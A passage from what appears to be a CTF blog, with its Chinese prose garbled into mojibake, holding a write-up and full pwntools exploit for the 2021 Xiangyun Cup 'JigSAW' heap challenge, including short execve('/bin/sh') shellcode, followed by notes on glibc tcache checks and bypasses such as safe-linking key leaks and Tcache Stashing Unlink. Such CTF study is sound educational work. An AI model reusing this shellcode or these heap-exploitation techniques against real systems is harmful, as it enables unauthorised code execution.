<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921090356101.png" alt="image-20210921090356101"></p>
<p>è¿™é‡Œçš„choiceæ˜¯intç±»å‹ï¼Œè€Œè¾“å…¥å´æ˜¯å¯ä»¥è¾“å…¥8å­—èŠ‚é•¿åº¦çš„æ•°æ®ï¼Œè€Œv2å°±æ˜¯choiceç›¸é‚»çš„é«˜32ä½çš„æ•°æ®ï¼Œè¦†ç›–v2å¤§äº14ä¼šå¾—åˆ°ä¸€å—å¯ä»¥æ‰§è¡Œçš„å †å†…å­˜</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921090223446.png" alt="image-20210921090223446"></p>
<p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå †å—å¯æ‰§è¡Œäº†</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921090636446.png" alt="image-20210921090636446"></p>
<p>å¹¶ä¸”å­˜åœ¨ç€åŠŸèƒ½ï¼Œæ˜¯å¯ä»¥æ‰§è¡Œå †å—çš„ï¼Œæ‰€ä»¥å¯ä»¥å¾€å †å—ä¸Šå†™shellcode</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921090735583.png" alt="image-20210921090735583"></p>
<p>ä½†æ˜¯ï¼Œå †å—åªèƒ½ç”Ÿæˆ0x10çš„å †å—ï¼Œæ‰€ä»¥ç›´æ¥å†™å…¥å¯ä»¥getshellçš„shellcodeé•¿åº¦æ˜¯è‚¯å®šä¸å¤Ÿçš„ï¼Œè‡³å°‘è¦äºŒåå¤šä¸ªå­—èŠ‚é•¿åº¦æ‰è¡Œï¼Œæ‰€ä»¥è¿™æ—¶å€™ä¸€èˆ¬å¯ä»¥å…ˆçœ‹çœ‹å¯„å­˜å™¨æœ‰æ²¡æœ‰ä»€ä¹ˆå¯ä»¥ç›´æ¥åˆ©ç”¨çš„è„æ•°æ®ï¼Œå‡å°‘shellcodeä¹¦å†™çš„é•¿åº¦</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921095449264.png" alt="image-20210921095449264"></p>
<p>æ–­ç‚¹ä¸‹åœ¨testå‡½æ•°è¦æ‰§è¡Œå †å—å†…å®¹çš„é‚£æ­¥ï¼ŒæŸ¥çœ‹åœ¨è¿™æ—¶å¯„å­˜å™¨å­˜äº†å“ªäº›è„æ•°æ®</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921095610649.png" alt="image-20210921095610649"></p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921100019587.png" alt="image-20210921100019587"></p>
<p>èƒ½å‘ç°ï¼ŒR10ä¿å­˜çš„æ˜¯ä¸€ä¸ªlibcä¸Šçš„åœ°å€ï¼Œæ‰€ä»¥å¯ä»¥å€Ÿç”¨è¿™ä¸ªå€¼å»è®¡ç®—free_hookä»¥åŠsystemçš„å€¼ï¼Œç„¶åå†æ‰¾ä¸ªå¯„å­˜å™¨ï¼Œè¿›è¡Œä¸¤æ¬¡æ‰§è¡Œæ“ä½œï¼ŒæŠŠsystemå†™å…¥free_hookä¸­ï¼Œç„¶åé‡Šæ”¾ä¸€å—å†™æœ‰â€™/bin/shâ€™çš„å †å—å³å¯</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921100059193.png" alt="image-20210921100059193"></p>
<p>å¦å¤–ä¸€ç§shellcodeå°±æ˜¯ç›´æ¥getshellï¼Œéœ€è¦æ›´å¤šçš„è§‚å¯Ÿ</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921101332945.png" alt="image-20210921101332945"></p>
<p>å¯ä»¥å‘ç°ï¼ŒRDXé‡Œé¢çš„å€¼æ˜¯å †ä¸Šçš„åœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å¾€å †ä¸Šå†™å…¥/bin/sh\x00ï¼Œç„¶åå†è®¡ç®—åç§»ï¼Œä¼ å…¥RDIï¼Œå†å°†RDXæ¸…é›¶ï¼ŒæŠŠ59ä¼ å…¥alï¼Œæœ€åç³»ç»Ÿè°ƒç”¨å³å¯ï¼Œä½†æ˜¯å› ä¸ºé•¿åº¦æœ‰é™ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸€å®šè¦æ³¨æ„</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921101858450.png" alt="image-20210921101858450"></p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921101917761.png" alt="image-20210921101917761"></p>
<p>åŒæ ·getshelll</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./JigSAW&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/ld-2.31.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Choice :&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index? :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Choice :&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index? :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;iNput:&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Choice :&quot;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index? :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Choice :&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index? :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">execve</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Choice :&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index? :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>p.sendlineafter(<span class="hljs-string">&quot;Name:\n&quot;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Make your Choice:\n&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;1095216660480&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">code1 = asm(&quot;add r10, 0x50068; mov r12, r10;&quot;)</span><br><span class="hljs-string">code2 = asm(&quot;sub r10, 0x1496b0; mov qword ptr [r12], r10&quot;)</span><br><span class="hljs-string">add(0)</span><br><span class="hljs-string">add(1)</span><br><span class="hljs-string">add(2)</span><br><span class="hljs-string">edit(0,code1)</span><br><span class="hljs-string">edit(1,code2)</span><br><span class="hljs-string">edit(2,&#x27;/bin/sh\x00&#x27;)</span><br><span class="hljs-string">debug()</span><br><span class="hljs-string">execve(0)</span><br><span class="hljs-string">execve(1)</span><br><span class="hljs-string">free(2)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = asm(<br>	<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">	add dl,0x20;</span><br><span class="hljs-string">	push rsi;</span><br><span class="hljs-string">	pop rdi;</span><br><span class="hljs-string">	xchg rdi,rdx;</span><br><span class="hljs-string">	push rsi;</span><br><span class="hljs-string">	pop rax;</span><br><span class="hljs-string">	mov al,59;ls</span><br><span class="hljs-string">	syscall;</span><br><span class="hljs-string">	&#x27;&#x27;&#x27;</span><br>	)<br>add(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;A&#x27;</span>)<br>add(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">0</span>,payload)<br>sleep(<span class="hljs-number">1</span>)<br>debug()<br>execve(<span class="hljs-number">0</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>ç¥¥äº‘æ¯PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>libcç‰ˆæœ¬æ£€æŸ¥æœºåˆ¶</title>
    <url>/2021/08/30/2021-08-30-libc%E7%89%88%E6%9C%AC%E6%A3%80%E6%9F%A5%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬ç¯‡æœ¬ç« æ˜¯ä»¥libc-2.23.soä¸ºåŸºç¡€ï¼Œå»å¯¹æ¯”ä¹‹åç‰ˆæœ¬çš„å·®å¼‚é—®é¢˜</p>
<h2 id="libc-2-23-so"><a href="#libc-2-23-so" class="headerlink" title="libc-2.23.so"></a>libc-2.23.so</h2><h3 id="Tcache"><a href="#Tcache" class="headerlink" title="Tcache"></a>Tcache</h3><p>tcacheæ˜¯åœ¨libc-2.27.soå¼•è¿›çš„ä¸€ç§æ–°æœºåˆ¶</p>
<h4 id="tcache-entry"><a href="#tcache-entry" class="headerlink" title="tcache_entry"></a><strong>tcache_entry</strong></h4><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* We overlay this structure on the user-data portion of a chunk when</span><br><span class="hljs-comment">   the chunk is stored in the per-thread cache.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>&#125; tcache_entry;<br></code></pre></td></tr></table></figure>

<h4 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a><strong>tcache_perthread_struct</strong></h4><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* There is one of these for each thread, which contains the</span><br><span class="hljs-comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span><br><span class="hljs-comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span><br><span class="hljs-comment">   are redundant (we could have just counted the linked list each</span><br><span class="hljs-comment">   time), this is for performance reasons.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">char</span> counts[TCACHE_MAX_BINS]; <br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> TCACHE_MAX_BINS                64</span><br><br><span class="hljs-keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="hljs-literal">NULL</span>;<br></code></pre></td></tr></table></figure>

<ul>
<li><code>tcache_prethread_struct</code> æ˜¯æ•´ä¸ª tcache çš„ç®¡ç†ç»“æ„ï¼Œå…¶ä¸­æœ‰ 64 é¡¹ entriesã€‚æ¯ä¸ª entries ç®¡ç†äº†è‹¥å¹²ä¸ªå¤§å°ç›¸åŒçš„ chunkï¼Œç”¨å•å‘é“¾è¡¨ (<code>tcache_entry</code>) çš„æ–¹å¼è¿æ¥é‡Šæ”¾çš„ chunkï¼Œè¿™ä¸€ç‚¹ä¸Šå’Œ fastbin å¾ˆåƒ</li>
<li>æ¯ä¸ª thread éƒ½ä¼šç»´æŠ¤ä¸€ä¸ª <code>tcache_prethread_struct</code></li>
<li><code>tcache_prethread_struct</code> ä¸­çš„ <code>counts</code> è®°å½• <code>entries</code> ä¸­æ¯ä¸€æ¡é“¾ä¸Š chunk çš„æ•°ç›®ï¼Œæ¯æ¡é“¾ä¸Šæœ€å¤šå¯ä»¥æœ‰ 7 ä¸ª chunk</li>
<li>tcache_entryç”¨äºé“¾æ¥ chunk ç»“æ„ä½“ï¼Œå…¶ä¸­çš„nextæŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªå¤§å°ç›¸åŒçš„ chunk<ul>
<li>è¿™é‡Œä¸ fastbin ä¸åŒçš„æ˜¯ fastbin çš„ fd æŒ‡å‘ chunk å¼€å¤´çš„åœ°å€ï¼Œè€Œ tcache çš„ next æŒ‡å‘ user data çš„åœ°æ–¹ï¼Œå³ chunk header ä¹‹å</li>
</ul>
</li>
</ul>
<p>ç®€å•æ¥è¯´ï¼šå°±æ˜¯ç±»ä¼¼fastbinä¸€æ ·çš„ä¸œè¥¿ï¼Œæ¯æ¡é“¾ä¸Šæœ€å¤šå¯ä»¥æœ‰ 7 ä¸ª chunkï¼Œfreeå †å—çš„æ—¶å€™ä¼˜å…ˆæ”¾å…¥tcacheä¸­ï¼Œæ»¡äº†æ‰æ”¾å…¥fastbinï¼Œunsorted binï¼Œmallocçš„æ—¶å€™ä¼˜å…ˆå»tcacheæ‰¾ï¼ˆtcacheçš„èŒƒå›´æ˜¯ [0x20, 0x410]ï¼Œè¶…è¿‡è¿™ä¸ªå¤§å°çš„å°±ä¼šæ”¾å…¥unsorted binï¼‰</p>
<p>tcache dupï¼šå› ä¸ºå‰å‡ ä¸ªç‰ˆæœ¬çš„ <code>tcache bin</code>æ˜¯ç¼ºä¹æ ¡éªŒæœºåˆ¶çš„ï¼Œå³ä½¿å¯¹<code>tcache bin chunk</code>é‡å¤é‡Šæ”¾ï¼Œä¹Ÿä¸ä¼šå¼•å‘ä»»ä½•å¼‚å¸¸ã€‚æ¯”<code>fastbin chunk</code>çš„çº¦æŸæ›´å°‘ï¼Œä¸€æ¥ä¸æ£€æŸ¥sizeåŸŸï¼ŒäºŒæ¥ä¹Ÿä¸æ£€æŸ¥æ˜¯å¦é‡å¤é‡Šæ”¾</p>
<p><code>tcache_perthread_struct</code>è¿™ä¸ªç»“æ„ä½“æ˜¯å¯ä»¥é‡Šæ”¾çš„ï¼Œå¹¶ä¸”å¯ä»¥å°†å®ƒé‡Šæ”¾åˆ°<code>unsorted bin</code>ä¸­å»ï¼ˆå‰ææ˜¯å…ˆä¿®æ”¹0x250å¤§å°å †å—çš„countä¸º7ï¼‰ï¼Œç„¶ååˆ†é…è¿™ä¸ª<code>unsorted bin chunk</code>ï¼Œå¯ä»¥æ§åˆ¶ä»»æ„åœ°å€åˆ†é…å †å†…å­˜ã€‚</p>
<h3 id="é«˜ç‰ˆæœ¬Tcache"><a href="#é«˜ç‰ˆæœ¬Tcache" class="headerlink" title="é«˜ç‰ˆæœ¬Tcache"></a>é«˜ç‰ˆæœ¬Tcache</h3><p>ä¸€ã€åœ¨libc-2.29.soåŠä»¥ä¸Šçš„ç‰ˆæœ¬å¾€tcacheç»“æ„ä½“æ·»åŠ äº†ä¸€ä¸ª<code>key</code>æ¥é˜²æ­¢double freeï¼Œåˆ¤æ–­æ¡ä»¶å°±æ˜¯tcache_entryçš„keyæŒ‡é’ˆï¼ˆè¢«é‡Šæ”¾å †å—çš„bkæŒ‡é’ˆä½ç½®ä¸Šå¡«å…¥tcacheçš„åœ°å€ï¼‰æ˜¯å¦ç­‰äº<strong>tcache bin</strong>çš„åœ°å€</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-comment">/* This field exists to detect double frees.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span> *<span class="hljs-title">key</span>;</span><br>&#125; tcache_entry;<br></code></pre></td></tr></table></figure>

<p>ç»•è¿‡ï¼šåˆ©ç”¨UAFæˆ–è€…æº¢å‡ºç­‰ç­‰ï¼Œä¿®æ”¹è¢«é‡Šæ”¾å †å—nextæŒ‡é’ˆï¼Œå“ªæ€•æ˜¯ä¸€ä¸ªå­—èŠ‚éƒ½è¡Œ</p>
<p>äºŒã€åœ¨<code> libc-2.32.so</code>ç‰ˆæœ¬ä¸­æ–°åŠ å…¥äº†ä¸€ä¸ª key ä¼šå¯¹ tcache next çš„å†…å®¹è¿›è¡Œå¼‚æˆ–</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> __always_inline <span class="hljs-keyword">void</span> </span><br><span class="hljs-function"><span class="hljs-title">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-keyword">size_t</span> tc_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>  <span class="hljs-comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="hljs-comment">     detect a double free.  */</span><br>  e-&gt;key = tcache;<br>  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]); <span class="hljs-comment">//ä¸æ˜¯ç›´æ¥èµ‹å€¼next</span><br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">static</span> __always_inline <span class="hljs-keyword">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">tcache_get</span> <span class="hljs-params">(<span class="hljs-keyword">size_t</span> tc_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);<br>  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);<br>  --(tcache-&gt;counts[tc_idx]);<br>  e-&gt;key = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *) e;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Safe-Linking:</span><br><span class="hljs-comment">Use randomness from ASLR (mmap_base) to protect single-linked lists</span><br><span class="hljs-comment">of Fast-Bins and TCache.  That is, mask the &quot;next&quot; pointers of the</span><br><span class="hljs-comment">lists&#x27; chunks, and also perform allocation alignment checks on them.</span><br><span class="hljs-comment">This mechanism reduces the risk of pointer hijacking, as was done with</span><br><span class="hljs-comment">Safe-Unlinking in the double-linked lists of Small-Bins.</span><br><span class="hljs-comment">It assumes a minimum page size of 4096 bytes (12 bits).  Systems with</span><br><span class="hljs-comment">larger pages provide less entropy, although the pointer mangling</span><br><span class="hljs-comment">still works.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PROTECT_PTR(pos, ptr) \</span><br><span class="hljs-meta">((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span><br></code></pre></td></tr></table></figure>

<p>PROTECT_PTRï¼šå¯¹ pos å³ç§»äº† 12 ä½ï¼ˆå»é™¤äº†æœ«å°¾çš„ 3 ä½ä¿¡æ¯ï¼‰ï¼Œå†å¼‚æˆ–åŸæ¥çš„æŒ‡é’ˆï¼ˆåœ¨è¿™ä¹‹å‰ next å‚¨å­˜çš„å †åœ°å€ï¼‰ã€‚</p>
<p>è€Œè¿™é‡Œçš„ <strong>key å°±æ˜¯å‚¨å­˜å†…å®¹çš„æŒ‡é’ˆï¼ˆåœ¨ä»£ç ä¸­å«åš posï¼‰</strong>ï¼Œåœ¨æ”¾å…¥çš„æ—¶å€™è®©å†…å®¹ä¸è¿™ä¸ª <strong>key</strong> è¿›è¡Œå¼‚æˆ–å†å‚¨å­˜ï¼Œåœ¨å–å‡ºçš„æ—¶å€™è®©å†…å®¹ä¸è¿™ä¸ª <strong>key</strong> è¿›è¡Œå¼‚æˆ–å†å–å‡ºã€‚è€Œå¾—ç›Šäºè¿™ä¸ªç§˜é’¥å°±æ˜¯å‚¨å­˜å†…å®¹çš„æŒ‡é’ˆï¼Œæ‰€ä»¥æ— éœ€ä½¿ç”¨å…¶ä»–ç©ºé—´æ¥æ”¾ç½®è¿™ä¸ª <strong>key</strong> çš„å†…å®¹ï¼Œåªéœ€è¦ä¿å­˜å¼‚æˆ–ä¹‹åçš„å†…å®¹ï¼Œåœ¨è§£å¯†æ—¶åªéœ€ <strong>PROTECT_PTR (&amp;ptr, ptr)</strong> è¿™æ ·æ“ä½œå³å¯ã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå½“ tcache ä¸­åªæœ‰ä¸€ä¸ªå…ƒç´ çš„æ—¶å€™ï¼Œä¹Ÿå°±æ˜¯åœ¨æ”¾å…¥è¿™ä¸ªå…ƒç´ çš„è¿‡ç¨‹ä¸­ï¼Œ<strong>tcache-&gt;entries[tc_idx] == 0</strong>ï¼Œåœ¨è¿™ä¸ªæ—¶å€™æ”¾å…¥å…ƒç´ çš„æ—¶å€™ä¼šå¼‚æˆ– 0ï¼Œä¹Ÿå°±æ˜¯åœ¨ <strong>e-&gt;next ä½ç½®å­˜æ”¾</strong>çš„å†…å®¹æ­£å¥½å°±æ˜¯ <strong>key çš„ä¿¡æ¯</strong>ï¼Œå› ä¸º <strong>key å¼‚æˆ– 0 è¿˜æ˜¯ç§˜é’¥</strong>ã€‚è€Œä¸”å°±ç®—ä¹‹ååŠ å…¥äº†å…¶ä»–çš„å…ƒç´ ï¼Œè¿™ä¸ªå…ƒç´ å§‹ç»ˆè¿˜æ˜¯åœ¨é“¾è¡¨çš„å°¾éƒ¨ï¼Œæ‰€ä»¥å†…å®¹ä¸ä¼šå‘ç”Ÿå˜åŒ–</p>
<p>ç»•è¿‡ï¼š</p>
<ul>
<li>é€šè¿‡ 0 å¼‚æˆ–ç§˜é’¥è¿˜æ˜¯ç§˜é’¥çš„è¿™ä¸ªç‰¹æ€§ï¼Œå½“ tcache é“¾ä¸Šåªæœ‰ä¸€ä¸ªæŒ‡é’ˆçš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ show å‡½æ•°æ¥ leak å‡ºç§˜é’¥çš„ä¿¡æ¯ï¼Œæœ‰äº†ç§˜é’¥çš„ä¿¡æ¯ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¼ªé€ ç§˜é’¥ä¿¡æ¯äº†</li>
<li>å¯ä»¥é€šè¿‡ largebin æ¥æ³„éœ²å †åœ°å€ï¼Œç”±äº key æ˜¯å½“å‰æŒ‡é’ˆ &gt;&gt; 12ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç¡®ä¿åœ¨ 4096 å­—èŠ‚å†…è¿™ä¸ª key éƒ½æ˜¯æ­£ç¡®çš„</li>
</ul>
<h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><h4 id="ä¸€ã€æ³„éœ²å †åŸºå€"><a href="#ä¸€ã€æ³„éœ²å †åŸºå€" class="headerlink" title="ä¸€ã€æ³„éœ²å †åŸºå€"></a>ä¸€ã€æ³„éœ²å †åŸºå€</h4><p>æ„é€ ä¸¤ä¸ªç›¸åŒ size çš„å †å— a å’Œ bï¼Œæˆ‘ä»¬å…ˆ free (a) è®©ä»–è¿›å…¥åˆ° tcache ä¸­ï¼Œå† free (b) ä¹Ÿè®©ä»–è¿›å…¥åˆ° tcache ä¸­ã€‚è¿™æ—¶å€™ï¼Œåœ¨å †å— b çš„ fd ä½ç½®å°±å­˜åœ¨ç€å †å— a çš„åœ°å€ï¼Œæˆ‘ä»¬ leak å‡ºæ¥å°±èƒ½å¤Ÿå¾—åˆ°å †åœ°å€</p>
<h2 id="libc-2-29-so"><a href="#libc-2-29-so" class="headerlink" title="libc-2.29.so"></a>libc-2.29.so</h2><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (size &lt;= <span class="hljs-number">2</span> * SIZE_SZ) || __glibc_unlikely (size &gt; av-&gt;system_mem)) 				malloc_printerr (<span class="hljs-string">&quot;malloc: invalid size (unsorted)&quot;</span>); <br><span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="hljs-number">2</span> * SIZE_SZ) || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem)) <br>    malloc_printerr (<span class="hljs-string">&quot;malloc: invalid next size (unsorted)&quot;</span>); <br><span class="hljs-keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size)) <br>    malloc_printerr (<span class="hljs-string">&quot;malloc: mismatching next-&gt;prev_size (unsorted)&quot;</span>); <br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim) || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av))) 		malloc_printerr (<span class="hljs-string">&quot;malloc: unsorted double linked list corrupted&quot;</span>);<br><span class="hljs-keyword">if</span> (__glibc_unlikely (prev_inuse (next))) <br>    malloc_printerr (<span class="hljs-string">&quot;malloc: invalid next-&gt;prev_inuse (unsorted)&quot;</span>); ...... ...... <span class="hljs-comment">/* remove from unsorted list */</span> <span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc: corrupted unsorted chunks 3&quot;</span>);<br>	unsorted_chunks (av)-&gt;bk = bck; <br>	bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure>

<ul>
<li><p>å¯¹äº<code>unsortbin</code>çš„è§£é“¾æ·»åŠ äº†éªŒè¯é“¾å®Œæ•´æ€§çš„æ£€æŸ¥ï¼Œè®© <code>unsortbin attack</code>å¤±æ•ˆ</p>
<ul>
<li><p>ç»•è¿‡ï¼š</p>
<p>1.largebinä¸­çš„chunk-&gt;fd_nextsize=0;</p>
<p>2.largebinä¸­çš„chunk-&gt;bk_nextsizeå¯æ§åˆ¶;</p>
<p>3.unsortedbiné‡Œçš„chunkå¤§äºlargebinï¼Œå¹¶ä¸”å¦‚æœè¿›å…¥largebinï¼Œæ˜¯åŒä¸€ä¸ªindexã€‚</p>
</li>
</ul>
</li>
</ul>
<h3 id="Tcache-Stashing-Unlink-Attack"><a href="#Tcache-Stashing-Unlink-Attack" class="headerlink" title="Tcache Stashing Unlink Attack"></a>Tcache Stashing Unlink Attack</h3><p>é«˜ç‰ˆæœ¬ä¸€æ ·å¯ç”¨ï¼Œå› ä¸ºæ˜¯å¯¹unlinkçš„ç»•è¿‡ï¼Œè‡³å°‘ç›®å‰æˆ‘çŸ¥é“çš„ï¼šåˆ°libc-2.32æ˜¯æ²¡é—®é¢˜çš„</p>
<h4 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h4><p>1.<code>smallbin</code>ä¸­å¯ä»¥æ§åˆ¶å¤§å°ä¸ºsizeå—çš„bkæŒ‡é’ˆ</p>
<p>2.<code>tcache</code>ä¸­sizeå—çš„ä¸ªæ•°ä¸º6</p>
<p>3.ç”³è¯·å †å—æ˜¯<code>calloc</code></p>
